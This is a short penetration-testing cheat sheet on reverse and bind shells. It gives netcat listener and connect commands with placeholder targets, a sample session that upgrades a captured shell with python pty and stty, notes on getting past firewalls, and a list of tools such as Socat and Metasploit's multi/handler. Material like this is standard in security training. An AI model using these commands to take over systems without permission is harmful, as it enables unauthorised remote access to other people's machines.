# Shells

## Attack tree

```text
1 Reverse shell
2 Bind shell
```

## Examples

### Netcat

Starting a netcat listener on Linux for receiving from a reverse shell of the target:

    # nc -lvnp <port-number>

To obtain a bind shell on a target where there is already a listener waiting on a chosen port of the target:

    # nc <target-ip> <chosen-port>

Stabilise a netcat shell on Linux systems:

* Spawn a better featured bash shell
* Export to have access to term commands such as `clear`
* Background the shell with `Ctrl+Z`. Back in our own terminal, use `stty raw -echo; fg` to turn off terminal echo 
(which gives access to tab autocompletes, the arrow keys, and `Ctrl+C` to kill processes) and foreground the shell. 

```text
adversary@kali:~# nc -lvnp <port-number>
listening on [any] <port-number>
connect to [...] from (UNKNOWN) [...]

python -c 'import pty;pty.spawn("/bin/bash")'
shell@linux:~$ export TERM=xterm
shell@linux:~$ ^Z
[1]+ Stopped        nc -lvnp <port-number>
adversary@kali:~# stty raw -echo; fg
nc -lvnp <port-number>

shell@linux:~$ whoami
shell
```

## Notes

Shells are used for interfacing with a Command Line environment (CLI) like the common `bash` or `sh` programs in 
Linux, and the `cmd.exe` and `Powershell` on Windows. When targeting remote systems it is sometimes possible to force 
an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, 
we want to use this initial access to obtain a shell running on the target.

* Reverse shells are when the target is forced to execute code that connects back to the attack computer. 
This requires setting up a listener which would be used to receive the connection on the attack machine. Reverse 
shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target.
* Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on 
the target. This would then be open up a port to receive on that you can connect to, and obtain remote code execution. 
This has the advantage of not requiring any configuration on the attack network, but may be prevented by firewalls 
protecting the target.

## Tools

* [Netcat](https://www.kali.org/tools/netcat/)
* [Socat](https://www.kali.org/tools/socat/)
* [Socat binaries](https://github.com/3ndG4me/socat/releases)
* [Metasploit -- multi/handler](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/handler)

## Resources